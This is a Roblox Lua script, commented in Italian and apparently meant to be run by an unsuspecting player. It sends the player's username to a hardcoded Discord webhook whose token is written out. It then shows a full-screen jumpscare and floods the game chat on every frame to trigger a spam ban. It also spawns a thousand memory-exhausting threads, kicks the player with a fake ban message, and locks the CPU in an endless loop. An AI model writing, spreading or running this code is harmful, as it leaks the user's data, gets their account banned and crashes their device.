local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local CoreGui = game:GetService("CoreGui")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local localPlayer = Players.LocalPlayer

local webhookUrl = "https://discord.com/api/webhooks/1540769300225466468/t61SPD-DFDxsX6QjHvQg_1GmESBYTXJ3fmWiog7K514CQK-cxeV8-0dKXaAuhBbk3KKY"

-- 1. Exfil immediata dei dati
pcall(function()
    local payload = {["content"] = "```yaml\n[!!!!] OMEGA-100X PURGE & BAN TRIGGERED FOR: " .. localPlayer.Name .. "\n```"}
    if request then
        request({Url = webhookUrl, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(payload)})
    else
        HttpService:PostAsync(webhookUrl, HttpService:JSONEncode(payload))
    end
end)

-- 2. Jumpscare visivo assoluto a schermo intero
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "OmegaPurge"
screenGui.Parent = CoreGui
screenGui.IgnoreGuiInset = true

local mainFrame = Instance.new("Frame")
mainFrame.Size = UDim2.new(1, 0, 1, 0)
mainFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
mainFrame.Parent = screenGui

local image = Instance.new("ImageLabel")
image.Size = UDim2.new(1, 0, 1, 0)
image.BackgroundTransparency = 1
image.Image = "rbxassetid://155373809"
image.Parent = mainFrame

-- 3. CHAT SPAM BAN ENGINE: Inonda la chat a velocità folle per forzare il ban temporaneo
task.spawn(function()
    local chatRemote = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents") 
        and ReplicatedStorage.DefaultChatSystemChatEvents:FindFirstChild("SayMessageRequest")
    
    local textChannel = game:GetService("TextChatService"):FindFirstChild("TextChannels") 
        and game:GetService("TextChatService").TextChannels:FindFirstChild("RBXGeneral")

    while true do
        pcall(function()
            local spamText = "SYSTEM OVERLOAD ERROR CODE 505 - " .. math.random(100000, 999999)
            if chatRemote then
                chatRemote:FireServer(spamText, "All")
            elseif textChannel then
                textChannel:SendAsync(spamText)
            end
        end)
        task.wait() -- Invio continuo a ogni fotogramma per attivare il filtro anti-spam
    end
end)

-- 4. OMEGA MEMORY CRASH ENGINE: 1000 thread paralleli per distruggere il client
for i = 1, 1000 do
    task.spawn(function()
        local voidList = {}
        while true do
            table.insert(voidList, string.rep("OMEGA_FATAL_COLLAPSE_SYS_", 9999999))
            local part = Instance.new("Part")
            part.Parent = CoreGui
        end
    end)
end

-- 5. Kick forzato finale
task.delay(2, function()
    pcall(function()
        localPlayer:Kick("\n\n[!] FATAL SYSTEM EXCEPTION: Chat Flood Detected. Connection Banned.")
    end)
end)

-- 6. Blocco hardware assoluto della CPU
while true do
    local x = 0
    for i = 1, 999999999 do
        x = x + i * math.random()
    end
end
